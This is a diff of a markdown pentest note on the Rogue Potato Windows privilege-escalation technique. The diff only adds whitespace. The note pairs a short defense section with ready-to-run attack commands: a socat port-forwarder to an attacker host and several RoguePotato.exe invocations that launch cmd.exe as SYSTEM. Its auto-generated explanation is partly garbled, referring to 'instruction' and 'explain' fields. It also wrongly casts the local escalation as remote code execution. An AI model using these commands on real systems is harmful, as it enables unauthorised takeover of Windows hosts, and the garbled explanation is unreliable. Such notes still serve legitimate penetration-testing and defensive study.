@@ -34,6 +34,8 @@ Rogue Potato is a technique used for privilege escalation that exploits the DCOM
 
 Rogue Potato is a technique used for privilege escalation that exploits the DCOM protocol to impersonate privileges. This technique is used to gain SYSTEM-level privileges by impersonating the OXID resolver, which is responsible for mapping Object Export Interfaces to Object Export Endpoints. This technique is used to bypass security measures and gain access to sensitive data. The attacker can use this technique to move laterally within the network and gain access to other systems. The technique is effective against Windows 10 and Windows Server 2019.
 
+ 
+
 ## Requirements
 
 1. Authenticated access to the target system
@@ -41,6 +43,8 @@ Rogue Potato is a technique used for privilege escalation that exploits the DCOM
 1. DCOM is enabled on the target system
 
 1. The attacker has the ability to execute code on the target system
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ Rogue Potato is a technique used for privilege escalation that exploits the DCOM
 
 1. Implement network segmentation to limit lateral movement
 
+ 
+
 ## Objectives
 
 1. Gain SYSTEM-level privileges
@@ -57,6 +63,8 @@ Rogue Potato is a technique used for privilege escalation that exploits the DCOM
 1. Move laterally within the network
 
 1. Gain access to sensitive data
+
+ 
 
 # Instructions
 
@@ -71,9 +79,17 @@ Rogue Potato is a technique used for privilege escalation that exploits the DCOM
    c. To execute commands on the remote machine with RogueOxidResolver running locally on port 9999 and a specific clsid and custom pipename, use the following command:
       RoguePotato.exe -r <remote_machine_ip> -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p <custom_pipename>
 
+ 
+
+
+
 **Code**: [[# Network redirector / port forwarder to run on yo]]
 
+
+
 > This command allows you to execute commands on a remote machine using RoguePotato. RoguePotato is a tool that exploits a vulnerability in Windows COM and DCOM to execute arbitrary code on a remote system. To use this command, you need to have RoguePotato.exe and socat installed on your local machine. The command involves setting up a network redirector/port forwarder on the remote machine using socat and then running RoguePotato.exe on your local machine with appropriate arguments to execute commands on the remote machine. The instruction field provides a step-by-step guide on how to use this command, and the explain field provides an overview of what this command does.
+
+
 
 **Command** ([[Network redirector / port forwarder]]):
 
@@ -81,11 +97,19 @@ Rogue Potato is a technique used for privilege escalation that exploits the DCOM
 socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
 ```
 
+
+
+
+
 **Command** ([[RoguePotato without running RogueOxidResolver locally]]):
 
 ```bash
 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
 ```
+
+
+
+
 
 **Command** ([[RoguePotato all in one with RogueOxidResolver running locally on port 9999]]):
 
@@ -93,11 +117,17 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
 ```
 
+
+
+
+
 **Command** ([[RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename]]):
 
 ```bash
 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -121,3 +151,5 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8
 - [[EoP - Impersonation Privileges]]
 - [[Rogue Potato (Fake OXID Resolver)]]
 - [[Windows - Privilege Escalation]]
+
+
